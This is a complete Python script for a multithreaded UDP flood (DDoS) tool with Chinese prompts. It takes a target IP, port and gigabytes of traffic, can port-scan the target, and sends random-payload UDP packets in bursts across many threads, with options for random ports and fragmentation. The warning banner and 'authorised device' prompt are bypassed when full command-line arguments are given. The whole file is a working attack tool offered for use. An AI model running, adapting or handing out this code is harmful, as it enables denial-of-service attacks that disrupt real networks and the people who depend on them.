import sys
import os
import time
import socket
import ipaddress
import random
import argparse
import threading

# [>] 正常运行日志
# [?] 等待输入
# [!] 错误警告
# [*] 选项


# ====================== 日志封装 ======================
class Logger:
    def __init__(self, path=None):
        self.fp = open(path, 'a', encoding='utf-8') if path else None

    def log(self, msg):
        print(msg)
        if self.fp:
            self.fp.write(msg + '\n')
            self.fp.flush()

    def close(self):
        if self.fp:
            self.fp.close()


# ====================== 清屏函数 ======================
def clear_screen():
    # 清屏，兼容 Windows (cls) 和 Unix-like (clear)
    os.system('cls' if os.name == 'nt' else 'clear')


# ====================== 艺术字与法律警告 ======================
def show_banner():
    clear_screen()
    print("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   Sucodesu")
    print("M       MMM M       MMM MMM     MMM MM       MM   Sucodesu")
    print("M  MMMM   M M  MMMM   M M   MMM   M M  MMMMM  M   Sucodesu")
    print("M  MMMMM  M M  MMMMM  M M  MMMMM  M M        MM   Sucodesu")
    print("M  MMMMM  M M  MMMMM  M M  MMMMM  M MMMMMMM   M   Sucodesu")
    print("M  MMMM   M M  MMMM   M M   MMM   M M   MMM   M   Sucodesu")
    print("M        MM M        MM MMM     MMM MM       MM   Sucodesu")
    print("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   Sucodesu")
    print("\n")
    print("========================== 警告 ==========================")
    print("你已经触碰到了法律底线，请立即退出，或等待3秒启动程序")
    print("=========================================================")
    print("\n")
    time.sleep(1)
    print("3")
    time.sleep(1)
    print("2")
    time.sleep(1)
    print("1")
    time.sleep(1)
    print("Starting...")
    time.sleep(1)

    clear_screen()
    os.system("figlet DDOS-Attack")
    print("Author  : Su-StackTrace")
    print("GitHub  : https://github.com/BC-809/DDoS-Attack_t3g85hxb670.git")
    print("")


# ====================== 参数解析 ======================
def build_parser():
    parser = argparse.ArgumentParser(
        description="UDP Flood Attack Tool (仅供授权隔离环境使用)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""示例:
  python DDOS-Attack_01_c.py                                       (全交互模式)
  python DDOS-Attack_01_c.py -t 192.168.1.100 -p 53 -g 1           (全命令行，跳过艺术字与确认)
  python DDOS-Attack_01_c.py -t 10.0.0.1 -p 80 -g 5 --random-port  (全命令行)
  python DDOS-Attack_01_c.py -t 10.0.0.1                           (部分参数，显示艺术字后交互补全)
"""
    )
    parser.add_argument('-t', '--target', default=None,
                        help='目标 IP 地址 (未提供则交互输入)')
    parser.add_argument('-p', '--port', type=int, default=None,
                        help='目标 UDP 端口 (未提供则交互输入或自动探测)')
    parser.add_argument('-g', '--gb', type=float, default=None,
                        help='总流量 (GB，未提供则交互输入)')
    parser.add_argument('-P', '--processes', type=int, default=4,
                        help='线程数 (默认: 4)')
    parser.add_argument('-T', '--threads', type=int, default=None,
                        help='同 -P (兼容别名)')
    parser.add_argument('-b', '--burst', type=int, default=50,
                        help='每突发包数 (默认: 50)')
    parser.add_argument('-r', '--rate', type=float, default=0.0,
                        help='速率限制 秒/突发 (默认: 0，不限速)')
    parser.add_argument('-d', '--duration', type=float, default=0,
                        help='攻击持续时间 (秒，默认: 0，直到发完)')
    parser.add_argument('-s', '--src-port', type=int, default=-1,
                        help='源端口基数 (-1 表示系统随机，默认: -1)')
    parser.add_argument('--size', type=int, default=None,
                        help='包大小 (字节，默认: 1490)')
    parser.add_argument('--random-port', action='store_true',
                        help='每个包随机目标端口')
    parser.add_argument('--log', default=None,
                        help='日志文件路径')
    parser.add_argument('--no-interactive', action='store_true',
                        help='跳过所有交互 (缺少必填参数时直接退出)')
    parser.add_argument('--max-retries', type=int, default=3,
                        help='最大重试次数 (默认: 3)')
    parser.add_argument('--no-prealloc', action='store_true',
                        help='禁用预分配 (Python 版无实际效果，保留接口)')
    parser.add_argument('--no-check', action='store_true',
                        help='跳过目标连通性检查')
    parser.add_argument('--no-banner', action='store_true',
                        help='强制跳过启动艺术字')
    return parser


# ====================== 交互式补齐缺失参数 ======================
def interactive_fill(args):
    """对缺失的必填参数进行交互式询问"""
    if args.target is None:
        while True:
            try:
                ip_str = input("[?] 目标 IP 地址: ").strip()
                ipaddress.ip_address(ip_str)
                args.target = ip_str
                break
            except ValueError:
                print("[!] 无效的 IP 地址，请重新输入")

    if args.port is None:
        while True:
            try:
                port_str = input("[?] 目标端口 (直接回车则自动探测): ").strip()
                if port_str == "":
                    args.port = None  # 稍后触发扫描
                    break
                port = int(port_str)
                if 1 <= port <= 65535:
                    args.port = port
                    break
                else:
                    print("[!] 端口必须在 1 到 65535 之间")
            except ValueError:
                print("[!] 无效的端口号，请输入数字，或直接回车自动探测")

    if args.gb is None:
        while True:
            try:
                gb_str = input("[?] 发送总流量 (GB): ").strip()
                total_gb = float(gb_str)
                if total_gb <= 0:
                    print("[!] 流量必须大于 0 GB")
                    continue
                args.gb = total_gb
                break
            except ValueError:
                print("[!] 无效的数值，请输入数字")

    if args.rate == 0.0:
        try:
            rate_str = input("[?] 发包间隔（秒，0 表示不限速，例如 0.1）: ").strip()
            if rate_str:
                args.rate = float(rate_str)
        except ValueError:
            pass

    if args.src_port == -1:
        src = input("[?] 指定源端口 (留空则系统随机分配): ").strip()
        if src:
            try:
                args.src_port = int(src)
            except ValueError:
                args.src_port = -1

    frag = input("[?] 启用 IP 分片? (y/N): ").strip().lower()
    args.frag = (frag == 'y')

    rnd = input("[?] 使用随机目标端口? (y/N): ").strip().lower()
    args.random_port = (rnd == 'y')
    return args


# ====================== 端口探测函数 ======================
def check_target(ip, port, timeout=1.0):
    # 简单 TCP 连接测试，返回 True/False
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.close()
        return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


def discover_open_port(ip, port_range, logger):
    # 扫描端口范围，返回第一个开放的端口号，同时显示正在探测的端口
    logger.log(f"[>] 正在扫描端口 {min(port_range)}-{max(port_range)}，请耐心等待...")
    try:
        for p in port_range:
            logger.log(f"[>] 正在探测端口: {p}")
            if check_target(ip, p):
                return p
    except KeyboardInterrupt:
        logger.log("\n[!] 扫描被用户中断。")
        return None
    return None


def choose_scan_mode():
    # 交互式选择扫描模式，返回端口迭代器
    print("\n[?] 请选择扫描模式：")
    print("[*] 1. 快速扫描 (常用端口)")
    print("[*] 2. 全端口扫描 (1-65535，耗时较长)")
    print("[*] 3. 自定义范围")
    mode = input("[?] 请输入选项 (1/2/3): ").strip()
    quick = [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]
    if mode == '1':
        return quick
    elif mode == '2':
        return range(1, 65536)
    elif mode == '3':
        try:
            start_port = int(input("[?] 起始端口: "))
            end_port = int(input("[?] 结束端口: "))
            if start_port < 1 or end_port > 65535 or start_port > end_port:
                print("[!] 端口范围无效，将使用快速扫描。")
                return quick
            return range(start_port, end_port + 1)
        except ValueError:
            print("[!] 输入无效，将使用快速扫描。")
            return quick
    else:
        print("[!] 选项无效，将使用快速扫描。")
        return quick


# ====================== 共享统计 ======================
stats_lock = threading.Lock()
stats = {"sent": 0, "bytes": 0, "dropped": 0}
stop_event = threading.Event()


# ====================== 攻击线程 ======================
def attack_worker(args, packet_payload, packet_size, thread_id, start_port):
    # 每个线程独立的 socket 和端口计数器
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # 源端口绑定（仅第一个线程或用户显式指定时）
    if args.src_port >= 0 and thread_id == 0:
        try:
            sock.bind(('', args.src_port))
        except OSError as e:
            print(f"[!] 线程 {thread_id}: 无法绑定源端口 {args.src_port}: {e}")

    # IP 分片（仅 Linux 普通 socket）
    if getattr(args, 'frag', False):
        try:
            if hasattr(socket, 'IP_MTU_DISCOVER') and hasattr(socket, 'IP_PMTUDISC_DO'):
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_MTU_DISCOVER, socket.IP_PMTUDISC_DO)
                if hasattr(socket, 'IP_DONTFRAGMENT'):
                    sock.setsockopt(socket.IPPROTO_IP, socket.IP_DONTFRAGMENT, 0)
        except (AttributeError, OSError):
            pass

    current_port = start_port
    local_sent = 0
    local_bytes = 0
    local_dropped = 0

    while not stop_event.is_set():
        # 每轮发送 burst 个包
        for _ in range(args.burst):
            if stop_event.is_set():
                break

            dst_port = random.randint(1, 65535) if args.random_port else current_port

            try:
                sock.sendto(packet_payload, (args.target, dst_port))
                local_sent += 1
                local_bytes += packet_size
            except OSError:
                # 重试
                retried = False
                for _ in range(args.max_retries):
                    try:
                        sock.sendto(packet_payload, (args.target, dst_port))
                        local_sent += 1
                        local_bytes += packet_size
                        retried = True
                        break
                    except OSError:
                        continue
                if not retried:
                    local_dropped += 1

            # 非随机端口：端口递增
            if not args.random_port:
                current_port += 1
                if current_port > 65534:
                    current_port = 1

        # 增量更新全局统计
        with stats_lock:
            stats["sent"] += local_sent
            stats["bytes"] += local_bytes
            stats["dropped"] += local_dropped
        local_sent = 0
        local_bytes = 0
        local_dropped = 0

        # 速率限制
        if args.rate > 0:
            time.sleep(args.rate)

    sock.close()


# ====================== 主函数 ======================
def main():
    parser = build_parser()
    args = parser.parse_args()

    # -T 兼容别名
    if args.threads is not None:
        args.processes = args.threads

    # ==================== 自动检测：是否显示艺术字 ====================
    # 完整命令行参数（-t/-p/-g 全给了）→ 跳过艺术字，直接运行
    # 无参数 或 部分参数 → 显示艺术字
    all_required_given = (
        args.target is not None and
        args.port is not None and
        args.gb is not None
    )

    # 保存初始判断结果，供后续"跳过确认"使用
    # 注意：交互填充后 args 会变化，必须用初始快照
    skip_confirm = all_required_given

    if not all_required_given and not args.no_banner:
        show_banner()

    # ==================== 交互补充缺失参数 ====================
    need_interactive = not all_required_given

    if need_interactive and args.no_interactive:
        print("[!] 缺少必填参数：-t/--target, -p/--port, -g/--gb")
        sys.exit(1)

    if need_interactive:
        interactive_fill(args)
    else:
        # 全命令行模式下，如果没有 --frag 属性，默认关闭
        if not hasattr(args, 'frag'):
            args.frag = False

    # ==================== 日志 ====================
    logger = Logger(args.log)

    # ==================== 参数校验 ====================
    try:
        ipaddress.ip_address(args.target)
    except ValueError:
        logger.log("[!] 无效的目标 IP 地址。")
        logger.close()
        sys.exit(1)

    if args.gb <= 0:
        logger.log("[!] 流量必须大于 0 GB。")
        logger.close()
        sys.exit(1)

    # ==================== 包大小 ====================
    if args.size is not None:
        packet_size = args.size
    else:
        packet_size = 3000 if getattr(args, 'frag', False) else 1490
    if packet_size < 64:
        packet_size = 64
    if packet_size > 65507:
        packet_size = 65507

    total_bytes = int(args.gb * 1024 * 1024 * 1024)
    max_packets = total_bytes // packet_size

    # ==================== 配置摘要 ====================
    logger.log(f"\n[*] 攻击配置:")
    logger.log(f"[*] 目标: {args.target}")
    logger.log(f"[*] 端口: {args.port if args.port else '自动探测'}")
    logger.log(f"[*] 总流量: {args.gb:.2f} GB ({max_packets} 包)")
    logger.log(f"[*] 线程数: {args.processes}")
    logger.log(f"[*] 每突发包数: {args.burst}")
    logger.log(f"[*] 包大小: {packet_size} 字节")
    if args.rate > 0:
        logger.log(f"[*] 速率限制: {args.rate}s / 突发")
    if args.duration > 0:
        logger.log(f"[*] 持续时间上限: {args.duration}s")
    if args.src_port >= 0:
        logger.log(f"[*] 源端口: {args.src_port}")
    if getattr(args, 'frag', False):
        logger.log(f"[*] IP 分片: 已启用")
    if args.random_port:
        logger.log(f"[*] 随机目标端口: 已启用")
    if args.max_retries > 0:
        logger.log(f"[*] 最大重试: {args.max_retries}")

    # ==================== 确定最终攻击端口 ====================
    final_port = args.port

    if final_port is None:
        # 未指定端口，强制扫描
        logger.log("[>] 用户未指定端口，启动端口扫描...")
        ports = choose_scan_mode()
        final_port = discover_open_port(args.target, ports, logger)
        if final_port is None:
            logger.log("[!] 未探测到任何开放端口，攻击无法继续。")
            logger.close()
            sys.exit(1)
        logger.log(f"[>] 探测成功，将使用开放端口: {final_port}")
    elif not args.no_check:
        # 指定了端口，检查连通性
        logger.log(f"[>] 正在检查端口 {final_port} 的连通性...")
        if check_target(args.target, final_port):
            logger.log(f"[>] 端口 {final_port} 可达，将直接使用。")
        else:
            logger.log(f"[!] 端口 {final_port} 不可达。")
            if not args.no_interactive:
                scan_choice = input("[?] 是否启动端口扫描以寻找可用端口？(y/n): ").strip().lower()
                if scan_choice == 'y':
                    ports = choose_scan_mode()
                    alt_port = discover_open_port(args.target, ports, logger)
                    if alt_port is not None:
                        logger.log(f"[>] 已找到开放端口: {alt_port}")
                        final_port = alt_port
                    else:
                        logger.log("[!] 未发现任何开放端口，仍使用原端口。")

    # ==================== 最终确认 ====================
    # 跳过条件（二者满足其一即可）：
    #   1. --no-interactive
    #   2. 启动时提供了完整命令行参数 (-t -p -g 齐全)
    if not args.no_interactive and not skip_confirm:
        logger.log(f"\n[!] 最后警告：你即将向 {args.target}:{final_port} 发送 {args.gb:.2f} GB UDP 流量。")
        confirm = input("[?] 请确认这是你拥有合法授权的设备 (yes/no): ").strip().lower()
        if confirm != 'yes':
            logger.log("[>] 用户取消。")
            logger.close()
            sys.exit(0)

    # ==================== 准备载荷 ====================
    payload = os.urandom(packet_size)

    # ==================== 启动线程 ====================
    logger.log(f"\n[>] 正在启动 {args.processes} 个攻击线程...")
    threads = []
    for i in range(args.processes):
        # 每个线程从 final_port 开始独立递增
        t = threading.Thread(
            target=attack_worker,
            args=(args, payload, packet_size, i, final_port),
            daemon=True
        )
        t.start()
        threads.append(t)

    logger.log(f"[>] 攻击已开始 (Ctrl+C 停止)")
    start_time = time.time()
    last_report_time = start_time

    # ==================== 主线程监控 ====================
    try:
        while True:
            time.sleep(0.5)
            now = time.time()
            elapsed = now - start_time

            # 检查停止条件
            with stats_lock:
                sent = stats["sent"]
            if sent >= max_packets:
                logger.log("[>] 已达到总包数，停止。")
                break
            if args.duration > 0 and elapsed >= args.duration:
                logger.log("[>] 已达到持续时间上限，停止。")
                break

            # 每 0.5 秒输出进度
            if now - last_report_time >= 0.5:
                with stats_lock:
                    sent = stats["sent"]
                    bytes_sent = stats["bytes"]
                    dropped = stats["dropped"]
                gb_sent = bytes_sent / (1024 * 1024 * 1024)
                pps = sent / elapsed if elapsed > 0 else 0
                pct = sent / max_packets * 100 if max_packets else 0
                logger.log(f"[>] {sent}/{max_packets} ({pct:.1f}%) | "
                           f"{gb_sent:.4f} GB | {elapsed:.1f}s | "
                           f"{pps:.0f} pps | dropped: {dropped}")
                last_report_time = now

    except KeyboardInterrupt:
        logger.log("\n[!] 用户手动停止。")
    finally:
        stop_event.set()
        for t in threads:
            t.join(timeout=2)

        # ==================== 最终统计 ====================
        elapsed = time.time() - start_time
        with stats_lock:
            sent = stats["sent"]
            bytes_sent = stats["bytes"]
            dropped = stats["dropped"]
        gb_total = bytes_sent / (1024 * 1024 * 1024)
        logger.log(f"\n[>] 发送完成。总包数: {sent}, 总数据量: {gb_total:.4f} GB, "
                   f"丢弃: {dropped}, 用时: {elapsed:.2f} 秒")
        logger.close()


if __name__ == "__main__":
    main()
